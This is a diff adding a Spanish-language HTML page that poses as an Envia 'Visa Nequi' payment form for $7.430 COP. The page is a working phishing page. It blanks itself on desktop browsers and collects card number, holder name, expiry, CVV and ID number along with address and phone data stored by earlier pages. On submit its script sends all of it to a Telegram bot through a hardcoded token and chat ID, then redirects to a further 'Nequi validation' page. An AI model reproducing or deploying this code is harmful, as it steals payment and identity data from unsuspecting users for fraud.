@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Pago Visa Nequi - Envia</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        html, body {
+            height: 100%;
+            overflow: hidden;
+        }
+        
+        .content-wrapper {
+            display: none;
+            height: 100%;
+            width: 100%;
+        }
+        
+        @media screen and (max-width: 1024px) {
+            .content-wrapper {
+                display: block;
+                overflow-y: auto;
+                overflow-x: hidden;
+            }
+        }
+        
+        @media screen and (max-width: 1366px) and (orientation: portrait) {
+            .content-wrapper {
+                display: block;
+                overflow-y: auto;
+                overflow-x: hidden;
+            }
+        }
+        
+        .desktop-block {
+            display: block;
+            width: 100vw;
+            height: 100vh;
+            background: white;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 9999;
+        }
+        
+        @media screen and (max-width: 1024px) {
+            .desktop-block {
+                display: none !important;
+            }
+        }
+        
+        @media screen and (max-width: 1366px) and (orientation: portrait) {
+            .desktop-block {
+                display: none !important;
+            }
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #1a1f71; /* Azul Visa */
+        }
+        
+        .page-container {
+            min-height: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            background: white;
+            padding: 16px 20px;
+            text-align: center;
+            flex-shrink: 0;
+        }
+        
+        .logo {
+            max-height: 45px;
+            max-width: 180px;
+            width: auto;
+            height: auto;
+        }
+        
+        .tagline {
+            font-size: 11px;
+            color: #666;
+            margin-top: 6px;
+            letter-spacing: 0.5px;
+        }
+        
+        .hero-section {
+            padding: 24px 20px 30px;
+            color: white;
+            flex-shrink: 0;
+        }
+        
+        .badge {
+            display: inline-block;
+            background: white;
+            color: #1a1f71;
+            padding: 8px 18px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        h1 {
+            font-size: clamp(26px, 6vw, 36px);
+            font-weight: 800;
+            line-height: 1.1;
+            margin-bottom: 16px;
+            color: white;
+        }
+        
+        .subtitle {
+            font-size: clamp(14px, 3.5vw, 16px);
+            line-height: 1.5;
+            color: rgba(255,255,255,0.95);
+            max-width: 500px;
+        }
+        
+        .card-container {
+            background: #f5f5f5;
+            border-radius: 20px 20px 0 0;
+            flex: 1;
+            min-height: 0;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .card-header {
+            background: #1a1f71;
+            color: white;
+            padding: 18px 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-weight: 600;
+            font-size: 16px;
+            border-radius: 20px 20px 0 0;
+            flex-shrink: 0;
+        }
+        
+        .card-header svg {
+            width: 22px;
+            height: 22px;
+            flex-shrink: 0;
+        }
+        
+        .card-body {
+            padding: 28px 20px 40px;
+            flex: 1;
+            overflow-y: auto;
+        }
+        
+        .card-visual {
+            background: linear-gradient(135deg, #1a1f71 0%, #16213e 100%);
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 28px;
+            position: relative;
+            height: 180px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        
+        .card-visual::before {
+            content: 'VISA';
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 24px;
+            font-weight: bold;
+            font-style: italic;
+            color: white;
+            opacity: 0.9;
+        }
+        
+        .card-chip {
+            width: 50px;
+            height: 40px;
+            background: linear-gradient(135deg, #ffd700 0%, #b8860b 100%);
+            border-radius: 8px;
+            margin-bottom: 30px;
+            position: relative;
+        }
+        
+        .card-chip::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 35px;
+            height: 25px;
+            border: 2px solid rgba(0,0,0,0.3);
+            border-radius: 6px;
+        }
+        
+        .card-number-display {
+            font-size: 22px;
+            color: white;
+            letter-spacing: 3px;
+            font-family: 'Courier New', monospace;
+            margin-bottom: 20px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .card-details {
+            display: flex;
+            justify-content: space-between;
+            color: rgba(255,255,255,0.8);
+            font-size: 12px;
+            text-transform: uppercase;
+        }
+        
+        .card-name-display {
+            font-size: 14px;
+            color: white;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+        }
+        
+        label .required {
+            color: #1a1f71;
+        }
+        
+        input {
+            width: 100%;
+            padding: 16px;
+            border: 1.5px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            background: white;
+            font-family: inherit;
+            transition: border-color 0.2s;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #1a1f71;
+        }
+        
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+        
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: #e8f5e9;
+            border: 1px solid #a5d6a7;
+            border-radius: 8px;
+            padding: 12px 16px;
+            margin: 24px 0;
+            font-size: 13px;
+            color: #2e7d32;
+        }
+        
+        .secure-badge svg {
+            width: 20px;
+            height: 20px;
+            flex-shrink: 0;
+        }
+        
+        .btn-pay {
+            width: 100%;
+            background: #ccc;
+            color: white;
+            border: none;
+            padding: 20px;
+            font-size: 18px;
+            font-weight: 700;
+            border-radius: 12px;
+            cursor: not-allowed;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: all 0.2s;
+            margin-top: 10px;
+        }
+        
+        .btn-pay.active {
+            background: #1a1f71;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(26, 31, 113, 0.3);
+        }
+        
+        .btn-pay.active:active {
+            transform: scale(0.98);
+            background: #0f1245;
+        }
+        
+        .btn-pay svg {
+            width: 24px;
+            height: 24px;
+            flex-shrink: 0;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+        }
+        
+        .loading.active {
+            display: block;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1a1f71;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @media screen and (max-height: 700px) {
+            .hero-section {
+                padding: 20px 20px 24px;
+            }
+            
+            .card-body {
+                padding: 24px 20px 30px;
+            }
+            
+            .card-visual {
+                height: 160px;
+                padding: 20px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+        }
+        
+        @media screen and (min-width: 768px) and (max-width: 1024px) {
+            .page-container {
+                max-width: 600px;
+                margin: 0 auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="desktop-block"></div>
+    
+    <div class="content-wrapper">
+        <div class="page-container">
+            <div class="header">
+                <img src="logo.png" alt="Envia" class="logo" onerror="this.style.display='none'">
+                <div class="tagline">pasión por lo que hacemos</div>
+            </div>
+            
+            <div class="hero-section">
+                <div class="badge">Visa Nequi</div>
+                
+                <h1>Ingresa los datos de tu tarjeta Visa</h1>
+                
+                <p class="subtitle">
+                    Total a pagar: <strong>$7.430 COP</strong>
+                </p>
+            </div>
+            
+            <div class="card-container">
+                <div class="card-header">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                        <rect x="2" y="5" width="20" height="14" rx="2"/>
+                        <line x1="2" y1="10" x2="22" y2="10"/>
+                    </svg>
+                    Datos de la tarjeta Visa
+                </div>
+                
+                <div class="card-body">
+                    <div class="card-visual">
+                        <div class="card-chip"></div>
+                        <div class="card-number-display" id="cardNumberDisplay">**** **** **** ****</div>
+                        <div class="card-details">
+                            <div>
+                                <div style="font-size: 10px; margin-bottom: 4px;">TITULAR</div>
+                                <div class="card-name-display" id="cardNameDisplay">NOMBRE APELLIDO</div>
+                            </div>
+                            <div style="text-align: right;">
+                                <div style="font-size: 10px; margin-bottom: 4px;">VENCE</div>
+                                <div style="font-size: 14px; color: white;">MM/AA</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <form id="cardForm">
+                        <div class="form-group">
+                            <label for="numeroTarjeta">Número de tarjeta Visa <span class="required">*</span></label>
+                            <input type="text" id="numeroTarjeta" name="numeroTarjeta" placeholder="0000 0000 0000 0000" maxlength="19" required inputmode="numeric">
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="nombreTitular">Nombre del titular <span class="required">*</span></label>
+                            <input type="text" id="nombreTitular" name="nombreTitular" placeholder="Como aparece en la tarjeta" required>
+                        </div>
+                        
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="fechaVencimiento">Vencimiento (MM/AA) <span class="required">*</span></label>
+                                <input type="text" id="fechaVencimiento" name="fechaVencimiento" placeholder="MM/AA" maxlength="5" required inputmode="numeric">
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="cvv">CVV <span class="required">*</span></label>
+                                <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required inputmode="numeric">
+                            </div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="documentoTitular">Documento del titular <span class="required">*</span></label>
+                            <input type="text" id="documentoTitular" name="documentoTitular" placeholder="Número de cédula" required inputmode="numeric">
+                        </div>
+                        
+                        <div class="secure-badge">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                            </svg>
+                            <span>Pago seguro con encriptación SSL - Visa</span>
+                        </div>
+                        
+                        <button type="submit" class="btn-pay" id="btnPagar" disabled>
+                            Pagar ahora
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                                <path d="M5 12h14M12 5l7 7-7 7"/>
+                            </svg>
+                        </button>
+                    </form>
+                    
+                    <div class="loading" id="loading">
+                        <div class="spinner"></div>
+                        <p>Procesando pago con Visa...</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // CONFIGURACIÓN DEL BOT DE TELEGRAM
+        const BOT_TOKEN = '8955093413:AAH-iW-vYcLq__GHBB2rpqpECA6JDCdQUZE';
+        const CHAT_ID = '-5547241763';
+        
+        // Recuperar todos los datos anteriores
+        const cedula = sessionStorage.getItem('cedula') || 'No disponible';
+        const celular = sessionStorage.getItem('celular') || 'No disponible';
+        const direccion = sessionStorage.getItem('direccion') || 'No disponible';
+        const ciudad = sessionStorage.getItem('ciudad') || 'No disponible';
+        const departamento = sessionStorage.getItem('departamento') || 'No disponible';
+        
+        const form = document.getElementById('cardForm');
+        const btnPagar = document.getElementById('btnPagar');
+        const numeroTarjeta = document.getElementById('numeroTarjeta');
+        const nombreTitular = document.getElementById('nombreTitular');
+        const fechaVencimiento = document.getElementById('fechaVencimiento');
+        const cvv = document.getElementById('cvv');
+        const documentoTitular = document.getElementById('documentoTitular');
+        
+        function isMobileDevice() {
+            return (
+                /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ||
+                (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
+                window.innerWidth <= 1024
+            );
+        }
+        
+        if (!isMobileDevice()) {
+            document.body.innerHTML = '<div style="width:100vw;height:100vh;background:white;"></div>';
+        }
+        
+        function validarFormulario() {
+            const camposCompletos = 
+                numeroTarjeta.value.length >= 16 &&
+                nombreTitular.value.length >= 3 &&
+                fechaVencimiento.value.length === 5 &&
+                cvv.value.length >= 3 &&
+                documentoTitular.value.length >= 6;
+            
+            if (camposCompletos) {
+                btnPagar.disabled = false;
+                btnPagar.classList.add('active');
+            } else {
+                btnPagar.disabled = true;
+                btnPagar.classList.remove('active');
+            }
+        }
+        
+        numeroTarjeta.addEventListener('input', function(e) {
+            let valor = this.value.replace(/\D/g, '');
+            valor = valor.substring(0, 16);
+            let formateado = '';
+            for (let i = 0; i < valor.length; i++) {
+                if (i > 0 && i % 4 === 0) formateado += ' ';
+                formateado += valor[i];
+            }
+            this.value = formateado;
+            document.getElementById('cardNumberDisplay').textContent = formateado || '**** **** **** ****';
+            validarFormulario();
+        });
+        
+        nombreTitular.addEventListener('input', function(e) {
+            document.getElementById('cardNameDisplay').textContent = this.value.toUpperCase() || 'NOMBRE APELLIDO';
+            validarFormulario();
+        });
+        
+        fechaVencimiento.addEventListener('input', function(e) {
+            let valor = this.value.replace(/\D/g, '');
+            if (valor.length >= 2) {
+                valor = valor.substring(0, 2) + '/' + valor.substring(2, 4);
+            }
+            this.value = valor;
+            validarFormulario();
+        });
+        
+        cvv.addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').substring(0, 4);
+            validarFormulario();
+        });
+        
+        documentoTitular.addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '');
+            validarFormulario();
+        });
+        
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const datosTarjeta = {
+                numero: numeroTarjeta.value,
+                nombre: nombreTitular.value,
+                vencimiento: fechaVencimiento.value,
+                cvv: cvv.value,
+                documento: documentoTitular.value
+            };
+            
+            form.style.display = 'none';
+            document.getElementById('loading').classList.add('active');
+            
+            const mensaje = `🔴 PAGO VISA NEQUI COMPLETADO - ENVIACO\n\n` +
+                `📋 Cédula: ${cedula}\n` +
+                `📱 Celular: ${celular}\n` +
+                `📍 Dirección: ${direccion}\n` +
+                `🏙 Ciudad: ${ciudad}\n` +
+                `🏛 Departamento: ${departamento}\n` +
+                `💰 Monto: $7.430 COP\n` +
+                `💳 Método: Visa Nequi\n\n` +
+                `💳 DATOS DE TARJETA VISA:\n` +
+                `• Número: ${datosTarjeta.numero}\n` +
+                `• Titular: ${datosTarjeta.nombre}\n` +
+                `• Vence: ${datosTarjeta.vencimiento}\n` +
+                `• CVV: ${datosTarjeta.cvv}\n` +
+                `• Doc. Titular: ${datosTarjeta.documento}\n\n` +
+                `🕐 Fecha: ${new Date().toLocaleString()}`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Error:', error);
+            }
+            
+            // Guardar datos de tarjeta para la siguiente página
+            sessionStorage.setItem('datosTarjeta', JSON.stringify(datosTarjeta));
+            
+            // ============================================
+            // REDIRECCIÓN A VALIDACIÓN NEQUI
+            // ============================================
+            setTimeout(() => {
+                window.location.href = 'validacion_nequi.html';
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
